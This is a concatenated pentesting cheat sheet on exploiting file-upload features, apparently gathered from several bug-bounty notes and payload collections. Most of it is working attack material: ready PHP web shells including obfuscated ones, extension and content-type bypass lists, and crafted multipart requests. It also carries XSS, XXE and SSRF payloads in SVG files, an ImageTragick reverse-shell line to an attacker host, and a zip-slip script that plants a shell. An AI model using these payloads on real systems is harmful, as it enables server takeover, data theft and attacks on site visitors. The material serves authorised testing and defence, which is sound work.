---

### **File Upload Vulnerabilities & Techniques**

#### **1. Basic Techniques**
- File Name Manipulation:
  - 02.mp3";id;#
  - Try uploading a text file with .png extension.
  - Try the same with .svg and inject XML: Video Tutorial (https://youtu.be/Iq6ThCmUTOU?si=-waZobykOkxOdf8L).
  - Try injecting XSS code in the file.

#### **2. Tools for Exploitation**
- Exif Tool: Manipulate metadata.
- jhead: Inject headers into image files.
- Video Tutorial: jhead (https://youtu.be/CmF9sEyKZNo?si=xpqlS0H2gpb7flmt).

#### **3. .htaccess File Manipulation**
- Add the following line to .htaccess:
  - AddType application/x-httpd-php .l33t
- Then upload a PHP file with .l33t extension.

#### **4. File Extension Bypass Techniques**
- file.jpg.{EXT}
- file.{EXT}.jpg
- file.{EXT}.xxxjpg
- file.{EXT}%00.jpg
- file.{EXT}\x00.jpg
- file.{EXT}%00
- file.{EXT}\x00
- file.{EXT}%20
- file.{EXT}%0d%0a.jpg
- file.{EXT}/
- file.{EXT}.\

#### **5. ZIP File Exploitation**
- Place RCE.php in a .zip file.
- Upload the .zip file.
- Access it via: http://www.target.com?file=zip://uploadedFile.zip%23RCE.php

#### **6. References**
- RCE Vulnerability in File Name: https://www.vaadata.com/blog/rce-vulnerability-in-a-file-name/
- Shell Uploading: https://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
- File Upload Security Tips: https://security-tips.vincd.com/file-upload/
- Multipart Parsers Validation Bypass: https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/

---
- https://0xcybery.github.io/blog/hacking-with-pdf##Introduction
- 
------------

---

### **File Upload Vulnerabilities and Exploitation**

---

#### **1. File Extension Bypass**
- **Blacklisted Extensions**:  
  - PHP: `.phtm`, `.phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`  
  - ASP: `.asp`, `.aspx`, `.cer`, `.asa`  
  - JSP: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`  
  - ColdFusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`  
  - Random capitalization: `.pHp`, `.pHP5`, `.PhAr`  

- **Whitelisted Extensions**:  
  - Double extensions: `file.jpg.php`, `file.php.jpg`  
  - Null byte injection: `file.php%00.jpg`, `file.php\x00.jpg`  
  - Trailing characters: `file.php.....`, `file.php/`, `file.php.\`  
  - Other tricks: `file.php%20`, `file.php%0d%0a.jpg`, `file.`, `.html`  

- **IIS (Windows)**: Upload `.asp` files using `.cer` or `.asa` extensions.  

---

#### **2. Payloads for File Upload**
- **PHP Web Shells**:  
  ```php
  <?php system($_GET["cmd"]);?>  // Usage: ?cmd=ls
  <?=`$_GET[0]`?>                // Usage: ?0=command
  <?=`$_POST[0]`?>               // Usage: POST with "0=command"
  <?=`{$_REQUEST['_']}`?>        // Usage: ?_=command or POST with "_=command"
  ```
- **Obfuscated PHP Payloads**:  
  ```php
  <?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`;?>
  <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
  ```

---

#### **3. Content-Type Manipulation**
- **Preserve filename but change content-type**:  
  - Use `Content-Type: image/jpeg`, `image/gif`, or `image/png` for malicious files.  

---

#### **4. Impact by File Extension**
- **Web Shell/RCE**: `.asp`, `.aspx`, `.php5`, `.php`, `.php3`  
- **Stored XSS/SSRF/XXE**: `.svg`, `.gif`  
- **CSV Injection**: `.csv`  
- **XXE**: `.xml`  
- **LFI/SSRF**: `.avi`  
- **HTML Injection/XSS**: `.html`, `.js`  
- **Pixel Flood Attack (DoS)**: `.png`, `.jpeg`  
- **RCE via LFI/DoS**: `.zip`  
- **SSRF/Blind XXE**: `.pdf`, `.pptx`  

---

#### **5. File Name Exploitation**
- **Path Traversal**:  
  - Example: `../../etc/passwd/logo.png`, `../../../logo.png`  
- **SQL Injection**:  
  - Example: `sleep(10).jpg`, `sleep(10)-- -.jpg`  
- **Command Injection**:  
  - Example: `; sleep 10;`  
- **XSS**:  
  - Example: `<svg onload=alert(document.domain)>.svg`  

---

#### **6. Other Test Cases**
- **ImageTragick (SVG)**:  
  - Exploit SSRF or RCE via SVG file upload.  
  - Example:  
    ```xml
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
      <script type="text/javascript">alert("XSS");</script>
    </svg>
    ```
- **Open Redirect via SVG**:  
  ```xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <svg onload="window.location='http://www.google.com'" xmlns="http://www.w3.org/2000/svg"></svg>
  ```

---

#### **7. Advanced Techniques**
- **Web Shell via `.htaccess`**:  
  - Upload `.htaccess` with:  
    ```plaintext
    AddType application/x-httpd-php .l33t
    ```  
  - Then upload a file with `.l33t` extension containing PHP code.  

- **Polyglot Web Shell**:  
  - Use `exiftool` to inject PHP code into an image:  
    ```bash
    exiftool -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
    ```  

- **EXIF Data Not Stripped**:  
  - Upload images with EXIF data and check if it’s preserved.  
  - Use tools like [exif.regex.info](http://exif.regex.info/exif.cgi) to verify.  

---

#### **8. Top HackerOne Reports**
- **Remote Code Execution**:  
  - Example: Logo upload on `www.semrush.com/my_reports` (792 upvotes).  
- **Web Shell via File Upload**:  
  - Example: `ecjobs.starbucks.com.cn` (673 upvotes).  
- **Blind XSS**:  
  - Example: Image upload on CS Money (412 upvotes, $1000).  
- **Unrestricted File Upload**:  
  - Example: `ambassador.mail.ru` (404 upvotes, $3000).  
- **SSRF via File Upload**:  
  - Example: Video upload on TikTok (139 upvotes, $2727).  

---

#### **9. Tools and Resources**
- **OCR for Captcha Bypass**: [Tesseract](https://github.com/tesseract-ocr/tesseract)  
- **Online Captcha Solvers**: [Capsolver](https://www.capsolver.com/)  
- **EXIF Sample Images**: [GitHub Repository](https://github.com/ianare/exif-samples)  

---

## Where to find
In upload file feature, for example upload photo profile feature

## How to exploit
read also this pdf it conayin a many of ideas                                                                                                               
1-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf                                    by`0xAwali`                   
2-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf                                      by`ebrahim hegazy`       

1. Change the `Content-Type` value
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```
Change the Content-Type
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/jpeg
```

2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
Content-Type: application/x-php
```
Change the request to this
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

3. Upload the payload, but start with GIF89a; and
```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```
And dont forget to change the content-type to image/gif

4. Bypass content length validation, it can be bypassed using small payload
```
(<?=`$_GET[x]`?>)
```

5. Using null byte in filename
```
file.php%00.gif
```

6. Using double extensions for the uploaded file
```
file.jpg.php
```

7.  Uploading an unpopular php extensions (php4,php5,php6,phtml)
```
file.php5
```

8. Try to randomly capitalizes the file extension
```
file.pHP5
```

9. Mix the tips!


- Upload Function
    - Extensions Impact
        - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
        - `SVG`: Stored XSS, SSRF, XXE
        - `GIF`: Stored XSS, SSRF
        - `CSV`: CSV injection
        - `XML`: XXE
        - `AVI`: LFI, SSRF
        - `HTML`, `JS` : HTML injection, XSS, Open redirect
        - `PNG`, `JPEG`: Pixel flood attack (DoS)
        - `ZIP`: RCE via LFI, DoS
        - `PDF`, `PPTX`: SSRF, BLIND XXE
    - Blacklisting Bypass
        - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
        - ASP → `asp`, `.aspx`, `.cer`, `.asa`
        - Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
        - Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
        - Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
    - Whitelisting Bypass
        - `file.jpg.php`
        - `file.php.jpg`
        - `file.php.blah123jpg`
        - `file.php%00.jpg`
        - `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
        - `file.php%00`
        - `file.php%20`
        - `file.php%0d%0a.jpg`
        - `file.php.....`
        - `file.php/`
        - `file.php.\`
        - `file.php#.png`
        - `file.`
        - `.html`
    - Vulnerabilities
        - [ ]  Directory Traversal
            - Set filename `../../etc/passwd/logo.png`
            - Set filename `../../../logo.png` as it might changed the website logo.
        - [ ]  SQL Injection
            - Set filename `'sleep(10).jpg`.
            - Set filename `sleep(10)-- -.jpg`.
        - [ ]  Command Injection
            - Set filename `; sleep 10;`
        - [ ]  SSRF
            - Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
            - SSRF Through `.svg` file.

            ```php
            <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
            ```

        - [ ]  ImageTragic

            ```
            push graphic-context
            viewbox 0 0 640 480
            fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
            pop graphic-context
            ```

        - [ ]  XXE
            - Upload using `.svg` file

            ```xml
            <?xml version="1.0" standalone="yes"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
            <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
               <text font-size="40" x="0" y="16">&xxe;</text>
            </svg>
            ```

            ```xml
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
                <image xlink:href="expect://ls"></image>
            </svg>
            ```

            - Using excel file
        - [ ]  XSS
            - Set file name `filename="svg onload=alert(document.domain)>"` , `filename="58832_300x300.jpg<svg onload=confirm()>"`
            - Upload using `.gif` file

            ```
            GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
            ```

            - Upload using `.svg` file

            ```xml
            <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
            ```

            ```xml
            <?xml version="1.0" standalone="no"?>
            <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

            <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
               <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
               <script type="text/javascript">
                  alert("HolyBugx XSS");
               </script>
            </svg>
            ```

        - [ ]  Open Redirect
            1. Upload using `.svg` file

            ```xml
            <code>
            <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
            <svg
            onload="window.location='https://attacker.com'"
            xmlns="http://www.w3.org/2000/svg">
            <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
            </svg>
            </code>
            ```

    - Content-ish Bypass
        - [ ]  Content-type validation
            - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` 
            to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
        - [ ]  Content-Length validation
            - Small PHP Shell

            ```php
            (<?=`$_GET[x]`?>)
            ```

        - [ ]  Content Bypass Shell
            - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )

            ```php
            GIF89a; <?php system($_GET['cmd']); ?>
            ```

    - Misc
        - [ ]  Uploading `file.js` & `file.config` (web.config)
        - [ ]  Pixel flood attack using image
        - [ ]  DoS with a large values name: `1234...99.png`
        - [ ]  Zip Slip
            - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
        - [ ]  Image Shell
            - Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

            ```php
            exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
            ```

---
# File Upload
### Defaults extensions
* PHP Server
```html
.php
.php3
.php4
.php5
.php7

# Less known PHP extensions
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc

```

* ASP Server
```html
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap

```
* JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
* Perl: `.pl, .pm, .cgi, .lib`
* Coldfusion: `.cfm, .cfml, .cfc, .dbm`
* Node.js: `.js, .json, .node`
* Erlang Yaws Web Server: `.yaws`

## Upload tricks
* Use double extensions : `.jpg.php, .png.php5`
* Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
* Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
* Null byte (works well against `pathinfo())`
  * `.php%00.gif`
  * `.php\x00.gif`
  * `.php%00.png`
  * `.php\x00.png`
  * `.php%00.jpg`
  * `.php\x00.jpg`
* Special characters
  * Multiple dots : `file.php......` , in Windows when a file is created with dots at the end those will be removed.
  * Whitespace and new line characters
      * `file.php%20`
      * `file.php%0d%0a.jpg`
      * `file.php%0a`
  * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
  * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
  * Multiple special characters: `file.jsp/././././.`
* Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
  * `Content-Type : image/gif`
  * `Content-Type : image/png`
  * `Content-Type : image/jpeg`
  * Content-Type wordlist: [SecLists/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
  * Set the Content-Type twice: once for unallowed type and once for allowed.
* [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
  * Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
    * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
    * JPG: `\xff\xd8\xff`
    * GIF: `GIF87a` OR `GIF8;`
  * Shell can also be added in the metadata
* Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")

* Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php
```bash
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png

```












## Filename vulnerabilities
Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.

* Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
* LFI/Path Traversal Payloads: e.g. `image.png../../../../../../../etc/passwd`
* XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
* File Traversal e.g. `../../../tmp/lol.png`
* Command Injection e.g. `; sleep 10;`

Also you upload:

* HTML/SVG files to trigger an XSS
* EICAR file to check the presence of an antivirus

## Picture Compression
Create valid pictures hosting PHP code. Upload the picture and use a Local File Inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.

* Picture Metadata, hide the payload inside a comment tag in the metadata.
* Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating getimagesize() and imagecreatefromgif().
    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php


## Picture with custom metadata
Create a custom picture and insert exif tag with exiftool. A list of multiple exif tags can be found at exiv2.org
```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

```

## Configuration Files
If you are trying to upload files to a :
* PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
* ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
* uWSGI server, take a look at the uwsgi.ini trick to execute code:
```bash
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)

```

Configuration files examples

* [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
* [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
* [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
* [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
* [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)


Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.

* package.json
```json
"scripts": {
    "prepare" : "/bin/touch /tmp/pwned.txt"
}

```
* composer.json
```json
"scripts": {
    "pre-command-run" : [
    "/bin/touch /tmp/pwned.txt"
    ]
}

```

## CVE - ImageMagick
If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context

```
More payloads in the folder `Picture ImageMagick`

## CVE - FFMpeg
FFmpeg HLS vulnerability

## ZIP archive
When a ZIP/archive file is automatically decompressed after the upload
* Zip Slip: directory traversal to write a file somewhere else
```bash
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15

ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt

```

## Jetty RCE
Upload the XML file to `$JETTY_BASE/webapps/`
* [JettyShell.xml - From Mikhail Klyuchnikov](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)

## wget File Upload/SSRF Trick
In some occasions you may find that a server is using wget to download files and you can indicate the URL. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, this check can be bypassed.
The maximum length of a filename in linux is 255, however, wget truncate the filenames to 236 characters. You can download a file called "A"*232+".php"+".gif", this filename will bypass the check (as in this example ".gif" is a valid extension) but wget will rename the file to "A"*232+".php".

```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080

```
```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]

```
> Note that another option you may be thinking of to bypass this check is to make the HTTP server redirect to a different file, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This won't work unless wget is being used with the parameter --trust-server-names because wget will download the redirected page with the name of the file indicated in the original URL.


## python code to create a malicious zip
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
    z.writestr('otherfile.xml', 'Content of the file')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 

create_zip()

```

* To achieve remote command execution I took the following steps:
1. Create a PHP shell:
```php
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>

```

2. Use “file spraying” and create a compressed zip file:
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: xxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#

```
3. Use a hexeditor or vi and change the “xxA” to “../”, I used vi:
```bash
:set modifiable
:%s/xxA/..\//g
:x!

```
Done!

Only one step remained: Upload the ZIP file and let the application decompress it! If it is succeeds and the web server has sufficient privileges to write the directories there will be a simple OS command execution shell on the system.




## Here’s a top 10 list of things that you can achieve by uploading (from [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):
1. **ASP / ASPX / PHP5 / PHP / PHP3:** Webshell / RCE
2. **SVG:** Stored XSS / SSRF / XXE
3. **GIF:** Stored XSS / SSRF
4. **CSV:** CSV injection
5. **XML:** XXE
6. **AVI:** LFI / SSRF
7. **HTML / JS:** HTML injection / XSS / Open redirect
8. **PNG / JPEG:** Pixel flood attack (DoS)
9. **ZIP:** RCE via LFI / DoS
10. **PDF / PPTX:** SSRF / BLIND XXE




## Tools
* [Fuxploider](https://github.com/almandin/fuxploider)
* [Burp > Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) and [github-portswigger](https://github.com/portswigger/upload-scanner)
* [ZAP > FileUpload AddOn](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/)


- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
- https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf
- https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf
- https://blog.doyensec.com/2025/01/09/cspt-file-upload.html
- 
- 
